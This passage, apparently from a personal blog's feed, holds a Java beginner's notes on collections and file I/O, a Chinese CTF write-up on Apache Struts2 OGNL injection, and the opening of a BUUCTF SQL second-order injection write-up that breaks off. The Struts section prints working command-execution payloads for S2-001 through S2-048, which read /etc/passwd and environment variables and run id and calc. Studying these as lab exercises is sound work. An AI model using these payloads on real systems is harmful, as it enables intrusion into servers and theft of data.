class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;2.上场女嘉宾&quot;</span>);</span><br><span class="line">                <span class="comment">//从键盘录入女嘉宾编号</span></span><br><span class="line">                System.out.println(<span class="string">&quot;请为女嘉宾输入编号&quot;</span>);</span><br><span class="line">                <span class="type">int</span> gnum;</span><br><span class="line">                gnum = sc.nextInt();</span><br><span class="line">                System.out.println(<span class="string">&quot;请输入女嘉宾的名字&quot;</span>);</span><br><span class="line">                 String gname=sc.next();</span><br><span class="line">                System.out.println(<span class="string">&quot;请输入女嘉宾的年龄&quot;</span>);</span><br><span class="line">                <span class="type">int</span> gage=sc.nextInt();</span><br><span class="line">                Girl g=<span class="keyword">new</span> <span class="title class_">Girl</span>(gnum,gname,gage);</span><br><span class="line">                g.setGnum(gnum);</span><br><span class="line">                g.setGname(gname);</span><br><span class="line">                g.setGage(gage);</span><br><span class="line">                <span class="comment">//创建一个集合，用于存放一个相同个体</span></span><br><span class="line"></span><br><span class="line">                list.add(g);<span class="comment">//添加女嘉宾</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (choice == <span class="number">3</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;3.下场女嘉宾&quot;</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">delNo</span> <span class="operator">=</span> sc.nextInt();<span class="comment">//下场对应的女嘉宾</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=list.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">                    Girl g=(Girl)list.get(i);</span><br><span class="line">                    <span class="keyword">if</span>(g.getGnum()==delNo)&#123;</span><br><span class="line">                        list.remove(g);</span><br><span class="line">                        System.out.println(<span class="string">&quot;可惜不是你，陪我到最后~~~&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;<span class="comment">//成功 停止遍历</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (choice == <span class="number">4</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;4.退出&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test08;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Gu0f3n.java.test05.Gire;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Girl</span> &#123;<span class="comment">//女嘉宾</span></span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="comment">//女嘉宾编号</span></span><br><span class="line">    <span class="comment">//名字</span></span><br><span class="line">    <span class="comment">//年龄</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> gnum;</span><br><span class="line">    <span class="keyword">private</span> String gname;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> gage;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGname</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGname</span><span class="params">(String gname)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gname = gname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getGnum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gnum;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGnum</span><span class="params">(<span class="type">int</span> gnum)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gnum = gnum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getGage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGage</span><span class="params">(<span class="type">int</span> gage)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gage = gage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Girl</span><span class="params">(<span class="type">int</span> gnum, String gname, <span class="type">int</span> gage)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gnum = gnum;</span><br><span class="line">        <span class="built_in">this</span>.gname = gname;</span><br><span class="line">        <span class="built_in">this</span>.gage = gage;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这上面基本上覆盖了之前学过的所有内容</p><h2 id="I-O流"><a href="#I-O流" class="headerlink" title="I&#x2F;O流"></a>I&#x2F;O流</h2><p>File 类作用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File类对象可封装要操作的文件，可通过File类的对象对文件进行操作，如查看文</span><br><span class="line">件的大小、判断文件是否隐藏、判断文件是否可读等。</span><br><span class="line">局限：File类的相关操作，并不涉及文件内容相关的操作，这是单独依靠File类对</span><br><span class="line">象无法实现的操作，此时需要借助I/O流完成。</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731325027010.png"></p><p>I&#x2F;O input&#x2F;output</p><p>分类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将I/O流理解为“管子”，那么生活中“管子&quot;怎么分类的呢？分类方式如下所示。</span><br><span class="line">方式1：按照方向划分。</span><br><span class="line">输入流、输出流。</span><br><span class="line">方式2：按照处理单元划分。</span><br><span class="line">字节流、字符流。</span><br><span class="line">方式3：按照功能划分。</span><br><span class="line">节点流、处理流</span><br></pre></td></tr></table></figure><p>i&#x2F;o流体系</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1731325333620.png"></p><p>练习</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test09;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//对文件进行操作，将文件封装为file 对象</span></span><br><span class="line">        File f= <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\CTF\\Audacity\\java project\\java study\\src\\Gu0f3n\\java\\test.txt&quot;</span>);</span><br><span class="line">        <span class="comment">//输入字符流</span></span><br><span class="line">        <span class="type">FileReader</span> <span class="variable">fr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(f);</span><br><span class="line">        <span class="comment">//开始</span></span><br><span class="line"><span class="comment">//        int n1 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n1);</span></span><br><span class="line"><span class="comment">//        int n2 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n2);</span></span><br><span class="line"><span class="comment">//        int n3 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n3);</span></span><br><span class="line"><span class="comment">//        int n4 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n4);</span></span><br><span class="line"><span class="comment">//        int n5 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n5);</span></span><br><span class="line"><span class="comment">//        int n6 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n6);</span></span><br><span class="line"><span class="comment">//        int n7 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n7);</span></span><br><span class="line"><span class="comment">//        int n8 = fr.read();</span></span><br><span class="line"><span class="comment">//        System.out.println(n8);</span></span><br><span class="line">        <span class="type">int</span> n=fr.read();</span><br><span class="line">        <span class="keyword">while</span>(n!=-<span class="number">1</span>)&#123;</span><br><span class="line">            System.out.println(n);</span><br><span class="line">            n=fr.read();</span><br><span class="line">        &#125;</span><br><span class="line">        fr.close();<span class="comment">//流关闭</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.安装jdk和IDEA&lt;/p&gt;
&lt;p&gt;2.创建自己的第一个项目&lt;/p&gt;
&lt;p&gt;3.编写自己的第一段代码&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;lin</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java study</title>
    <link href="https://gu0f3n.github.io/2024/09/04/study/"/>
    <id>https://gu0f3n.github.io/2024/09/04/study/</id>
    <published>2024-09-04T07:18:26.000Z</published>
    <updated>2024-09-09T08:45:36.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><p>点进去发现一个登录框</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_12.png"></p><p>没思路 看wp</p><p>了解下</p><p>Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架</p><p>描述：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%&#123;value&#125;并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于%&#123;value&#125;对提交的数据执行OGNL表达式解析，因此服务器可以直接发送有效载荷来执行命令。</span><br></pre></td></tr></table></figure><p>在这里提到了 OGNL 表达式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OGNL（Object-Graph Navigation Language）是一种用于在Java应用程序中访问和操作对象图的表达式语言。OGNL最初是由Drew Davidson和Luke Blanshard开发的，主要用于Java的对象属性访问和修改，类似于其他表达式语言如JSTL、EL等。OGNL表达式可以用来简化对复杂对象结构的访问和操作，非常适合于MVC框架中绑定表单数据到模型对象的场景</span><br></pre></td></tr></table></figure><h3 id="OGNL-表达式的基本功能"><a href="#OGNL-表达式的基本功能" class="headerlink" title="OGNL 表达式的基本功能"></a>OGNL 表达式的基本功能</h3><ol><li><ol><li><strong>对象属性访问</strong>：使用<code>.</code>（点号）访问对象的属性。例如，<code>person.name</code> 可以获取<code>person</code>对象的<code>name</code>属性。</li><li><strong>集合和数组访问</strong>：OGNL 支持通过索引访问集合和数组中的元素。例如，<code>list[0]</code> 可以访问列表中的第一个元素。</li><li><strong>方法调用</strong>：OGNL 可以调用对象的方法。例如，<code>person.getName()</code> 可以调用<code>person</code>对象的<code>getName()</code>方法。</li><li><strong>操作符支持</strong>：OGNL 支持多种操作符，例如算术操作符（<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>），逻辑操作符（<code>&amp;&amp;</code>, <code>||</code>），比较操作符（<code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>）等。</li><li><strong>上下文变量</strong>：OGNL 支持通过 <code>#</code> 访问上下文变量。例如，<code>#root</code> 访问当前的根对象，<code>#this</code> 访问当前的对象。</li><li><strong>表达式求值</strong>：可以使用OGNL表达式直接求值或进行复杂的逻辑运算。</li></ol></li></ol><p>我们在这里简单的了解下这个表达式</p><p>如何分辨这种类型的漏洞的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.常见的action.do后缀结尾</span><br><span class="line">2.user!list.action带感叹号式</span><br><span class="line">3.test?actionErrors=11111111111404/500响应并目页面打印11111111111</span><br><span class="line">4.后缀不带action do，不能说明不是struts2</span><br></pre></td></tr></table></figure><p>s2-001是一个struts2命令执行漏洞编号，漏洞介绍：<a href="https://www.freebuf.com/column/224041.html">https://www.freebuf.com/column/224041.html</a></p><p>漏洞部分代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">translateVariables</span><span class="params">(<span class="type">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> expression.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> start + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                --count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">        <span class="keyword">if</span> (evaluator != <span class="literal">null</span>) &#123;</span><br><span class="line">            o = evaluator.evaluate(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> expression.substring(<span class="number">0</span>, start);</span><br><span class="line">        <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> expression.substring(end + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                result = left + o;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = o;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                result = result + right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expression = left + o + right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = left + right;</span><br><span class="line">            expression = left + right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//这段代码的核心流程就是不断在 expression 中查找占位符 &#123;&#125;，解析变量并替换成对应的值。如果提供了 evaluator，还会对找到的值进一步处理。最终返回的结果是替换后的完整字符串或对象，并且可以根据需要转换成指定类型。</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);<span class="comment">//尝试在字符串 expression 中找到一个复合字符串的起始位置，该复合字符串是由变量 open 和 &quot;&#123;&quot; 组合而成的。</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br></pre></td></tr></table></figure><p>简单来说就是你输出给password的是OGNL 表达式 这样一大串代码会直接执行你的代码</p><p>例如我们执行一个**%{1-1}**</p><p>发现回显一个0</p><p>根据上面的OGNL 表达的用法（用下wp的payload）参考：<a href="https://blog.csdn.net/q20010619/article/details/120729447">https://blog.csdn.net/q20010619/article/details/120729447</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 获取tomcat路径</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 获取web路径</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line">// 命令执行 env，flag就在其中</span><br><span class="line">password=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_11.png"></p><h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p>这个漏洞有个检测工具后</p><p>下载地址：<a href="https://github.com/abc123info/Struts2VulsScanTools/releases">https://github.com/abc123info/Struts2VulsScanTools/releases</a></p><p>S2-003</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.0.0 - Struts 2.0.11.2</span><br></pre></td></tr></table></figure><p>S2-005</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</span><br></pre></td></tr></table></figure><p>Struts2框架在处理表单数据时，会将表单数据绑定到Action对象的相应属性上。攻击者可以通过在表单中提交特定的字符串，从而绕过Struts2的安全过滤机制，直接执行任意代码</p><p>工具展示</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_17.png"></p><h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><p>工具解决即可</p><p>了解下漏洞S2-007</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当用户提交 age 为字符串而非整形数值时，后端用代码拼接 &quot;&#x27;&quot; + value + &quot;&#x27;&quot; 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</span><br></pre></td></tr></table></figure><p>age 框执行了命令</p><h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。<br>姿势1：cookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie:(&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;)(1)(2)=Aluvion; (&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;)(1)(2)=Twings;</span><br></pre></td></tr></table></figure><p>姿势2：调试模式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29)</span><br></pre></td></tr></table></figure><h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_18.png"></p><p>漏洞原理：</p><p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于#号，同样使用编码\u0023或\43进行绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。</p><p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用&#x2F;helloword.acton?example&#x3D;<OGNL statement>&amp;(example)(‘xxx’)&#x3D;1的方法来执行它，从而绕过官方对#、\等特殊字符的防御。</p><p>访问<a href="http://your-ip:8080/ajax/example5.action%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E8%AF%A5%E6%8E%A7%E5%88%B6%E5%99%A8%E3%80%82%E6%8C%89%E7%85%A7%E5%8E%9F%E7%90%86%E4%B8%AD%E8%AF%B4%E5%88%B0%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E5%B0%86OGNL%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E6%94%BE%E5%9C%A8name%E5%8F%82%E6%95%B0%E9%87%8C">http://your-ip:8080/ajax/example5.action即可访问该控制器。按照原理中说到的方法，将OGNL利用代码放在name参数里</a></p><p>poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure><p>工具直接出</p><h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p>由url可以得知漏洞是S2-012</p><p>漏洞原理：</p><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：、</p><package name="S2-012" extends="struts-default">    <action name="user" class="com.demo.action.UserAction">        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>        <result name="input">/index.jsp</result>        <result name="success">/index.jsp</result>    </action></package>这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。<p>poc：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p><p>none - 链接不包含请求的任意参数值（默认）<br>get - 链接只包含 GET 请求中的参数和其值<br>all - 链接包含 GET 和 POST 所有参数和其值<br>&lt;s:a&gt;用来显示一个超链接，当includeParams&#x3D;all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。<br>poc：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">// 或</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure><p>感觉工具都能直接写出来 后面的就不写了</p><h1 id="web295-S2-048"><a href="#web295-S2-048" class="headerlink" title="web295:S2-048"></a>web295:S2-048</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc:%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web279&quot;&gt;&lt;a href=&quot;#web279&quot; class=&quot;headerlink&quot; title=&quot;web279&quot;&gt;&lt;/a&gt;web279&lt;/h2&gt;&lt;p&gt;点进去发现一个登录框&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercont</summary>
      
    
    
    
    <category term="ctfshow" scheme="https://gu0f3n.github.io/categories/ctfshow/"/>
    
    
    <category term="复现" scheme="https://gu0f3n.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF</title>
    <link href="https://gu0f3n.github.io/2024/08/09/BUUCTF/"/>
    <id>https://gu0f3n.github.io/2024/08/09/BUUCTF/</id>
    <published>2024-08-09T01:09:16.000Z</published>
    <updated>2024-08-10T03:40:41.859Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>一个登录页面，应该要先注册进入</p><p>随便注册</p><p>进入发现可以修改密码 第一想法就是二次注入</p><h2 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入"></a>什么是二次注入</h2><p>参考文章：<a href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，**恶意数据被读取并进入到SQL查询语句**所导致的注入。防御者即使对用户输入的恶意数据进行转义，当数据插入到数据库中时被处理的数据又被还原，Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</span><br><span class="line"></span><br><span class="line">也就是说一次攻击造成不了什么，但是两次配合起来就会造成注入漏洞。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL二次注入，指的是在有些应用场景下，我们先把SQL注入的payload写入到目标站点数据库中，然后再在某些实际将该数据取出，使得我们写入的payload执行。</span><br><span class="line">因此，SQL二次注入一般分为2步，第一步即向目标站点的数据库中插入恶意数据，第二步即使得我们插入的恶意数据被目标站点所引用。</span><br><span 